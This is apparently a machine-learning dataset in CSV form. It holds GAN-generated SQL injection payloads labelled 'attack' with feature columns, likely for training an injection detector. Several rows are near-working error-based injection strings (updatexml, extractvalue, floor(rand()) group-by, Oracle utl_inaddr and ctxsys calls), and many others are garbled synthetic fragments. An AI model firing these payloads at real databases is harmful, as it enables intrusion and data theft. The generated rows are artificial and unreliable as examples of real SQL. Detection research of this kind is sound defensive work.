label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack, concatc'  =  =  )   and 2131 5305  =  =,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,360,40.0,15.0,3.153055907333276,10.0,8.0,16.0,6.0,0.25,0.2,0.4,0.15,1.0,0.0,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"by'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'f8877q' like '' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,361,403.0,38.0,3.6908370630742415,100.0,81.0,168.0,54.0,0.24813895781637718,0.20099255583126552,0.41687344913151364,0.13399503722084366,6.0,0.0,0.0,0.0,1.0,3.0,0.0,31.0,0.0,0.0,10.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1'+  (  select 'zwyoy'  =  'w' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'uzl'  =  'ul'  =  'z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,362,217.0,33.0,3.9228283146654332,56.0,47.0,78.0,36.0,0.25806451612903225,0.21658986175115208,0.35944700460829493,0.16589861751152074,10.0,0.0,0.0,0.0,0.0,5.0,0.0,12.0,0.0,0.0,6.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%p""  =  ""'  =  '' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,363,515.0,41.0,3.868412536983258,140.0,101.0,206.0,68.0,0.27184466019417475,0.19611650485436893,0.4,0.13203883495145632,6.0,2.0,0.0,0.0,2.0,5.0,0.0,37.0,1.0,0.0,12.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1%""  =  ""jwwww  )   or AND m1  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,364,34.0,15.0,3.0108934608348163,11.0,2.0,15.0,6.0,0.3235294117647059,0.058823529411764705,0.4411764705882353,0.17647058823529413,0.0,2.0,0.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-4838'5996  )eeu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'now'  =  'w%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,365,203.0,35.0,3.97592214326948,45.0,54.0,71.0,33.0,0.22167487684729065,0.2660098522167488,0.3497536945812808,0.1625615763546798,7.0,0.0,1.0,0.0,0.0,4.0,0.0,12.0,1.0,0.0,6.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvf'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,366,348.0,38.0,3.790153645214119,104.0,55.0,145.0,44.0,0.2988505747126437,0.15804597701149425,0.4166666666666667,0.12643678160919541,6.0,0.0,0.0,0.0,2.0,3.0,0.0,26.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'l    sfv""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,367,337.0,40.0,3.856417766950186,106.0,55.0,137.0,39.0,0.314540059347181,0.1632047477744807,0.4065281899109792,0.11572700296735905,2.0,2.0,0.0,0.0,2.0,2.0,0.0,24.0,0.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""or by by 7562  =  9891  5856  =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,368,247.0,33.0,3.431560849173785,53.0,43.0,118.0,33.0,0.2145748987854251,0.17408906882591094,0.4777327935222672,0.13360323886639677,0.0,2.0,1.0,0.0,1.0,4.0,0.0,20.0,0.0,0.0,4.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 's'  =  'exbwywyzwp",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,369,638.0,40.0,3.981492131623426,215.0,109.0,242.0,72.0,0.33699059561128525,0.17084639498432602,0.3793103448275862,0.11285266457680251,6.0,0.0,0.0,0.0,4.0,3.0,0.0,44.0,1.0,0.0,12.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,12.0,6.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"1%""  =  ""hu'  =  'z' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,370,202.0,35.0,3.90888268572891,52.0,43.0,75.0,32.0,0.25742574257425743,0.21287128712871287,0.3712871287128713,0.15841584158415842,4.0,4.0,0.0,0.0,0.0,5.0,0.0,11.0,1.0,0.0,5.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'aywnyjyup,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,371,338.0,35.0,3.699246574209133,101.0,45.0,136.0,56.0,0.2988165680473373,0.13313609467455623,0.40236686390532544,0.16568047337278108,2.0,0.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'  )   or y  = co  select catu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,372,31.0,15.0,3.2195370358443802,15.0,1.0,12.0,3.0,0.4838709677419355,0.03225806451612903,0.3870967741935484,0.0967741935483871,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +''  =  'bj",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,373,243.0,34.0,3.9461681818280345,83.0,45.0,87.0,28.0,0.34156378600823045,0.18518518518518517,0.35802469135802467,0.11522633744855967,4.0,0.0,0.0,0.0,0.0,3.0,0.0,14.0,0.0,0.0,5.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ''   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ''  =  'dx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,374,653.0,39.0,3.8557814523572085,206.0,109.0,262.0,76.0,0.31546707503828486,0.1669218989280245,0.4012251148545176,0.11638591117917305,6.0,0.0,0.0,0.0,4.0,3.0,0.0,48.0,1.0,0.0,12.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,12.0,6.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"-""4607   or 4493  =  select where 5483  =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,375,46.0,21.0,3.5941078799230244,13.0,12.0,16.0,5.0,0.2826086956521739,0.2608695652173913,0.34782608695652173,0.10869565217391304,0.0,1.0,1.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-5032'  )ah-_gp    9067'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   's where cx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,376,354.0,41.0,3.9740552613208804,114.0,62.0,137.0,41.0,0.3220338983050847,0.1751412429378531,0.3870056497175141,0.11581920903954802,3.0,0.0,2.0,0.0,2.0,1.0,0.0,25.0,0.0,1.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"-7810'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ' 21311  select_ 2017  =  =  =  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,377,242.0,34.0,3.8634593503452233,75.0,49.0,90.0,28.0,0.30991735537190085,0.2024793388429752,0.371900826446281,0.11570247933884298,2.0,0.0,1.0,0.0,0.0,5.0,0.0,14.0,0.0,1.0,5.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'dtxd'  =  'u'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,378,278.0,35.0,3.984548303027653,105.0,35.0,101.0,37.0,0.3776978417266187,0.12589928057553956,0.36330935251798563,0.13309352517985612,6.0,0.0,0.0,0.0,2.0,3.0,0.0,18.0,0.0,2.0,5.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1''j  coxdl"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,379,19.0,13.0,3.5110854081804272,10.0,1.0,4.0,4.0,0.5263157894736842,0.05263157894736842,0.21052631578947367,0.21052631578947367,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '))    ))     )    )    )   rysns  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,380,213.0,27.0,3.208084664560777,44.0,35.0,103.0,31.0,0.20657276995305165,0.1643192488262911,0.4835680751173709,0.14553990610328638,2.0,0.0,0.0,0.0,0.0,1.0,0.0,23.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,381,838.0,44.0,3.8485673515873784,252.0,119.0,345.0,122.0,0.30071599045346065,0.14200477326968974,0.4116945107398568,0.14558472553699284,2.0,6.0,0.0,0.0,2.0,5.0,0.0,68.0,3.0,2.0,11.0,27.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,3.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""  ahmswxy",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,382,637.0,41.0,3.7930083901896543,191.0,83.0,267.0,96.0,0.29984301412872844,0.130298273155416,0.41915227629513346,0.15070643642072212,0.0,4.0,0.0,0.0,2.0,3.0,0.0,54.0,2.0,2.0,6.0,25.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,3.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-7864)    ))     ( 7881 group p,  )=  x",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,383,39.0,17.0,3.2147640777811337,7.0,8.0,16.0,8.0,0.1794871794871795,0.20512820512820512,0.41025641025641024,0.20512820512820512,0.0,0.0,1.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  """"  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,384,16.0,5.0,1.875,0.0,1.0,8.0,7.0,0.0,0.0625,0.5,0.4375,0.0,4.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'w'  =  'ejvbxgsd'  =  'v",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,385,234.0,33.0,3.4058899162532117,56.0,32.0,111.0,35.0,0.23931623931623933,0.13675213675213677,0.47435897435897434,0.14957264957264957,6.0,0.0,0.0,0.0,1.0,3.0,0.0,20.0,0.0,0.0,4.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"j7864,p  tu_in6237)selectcw' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||''  =  'pyw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,386,215.0,36.0,4.145921700046846,63.0,54.0,69.0,29.0,0.2930232558139535,0.25116279069767444,0.3209302325581395,0.13488372093023257,4.0,0.0,0.0,0.0,0.0,3.0,0.0,12.0,0.0,1.0,7.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"from'  )   )    as when,=  =,  6082 4386",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,387,40.0,21.0,3.6068441215341682,10.0,8.0,15.0,7.0,0.25,0.2,0.375,0.175,1.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
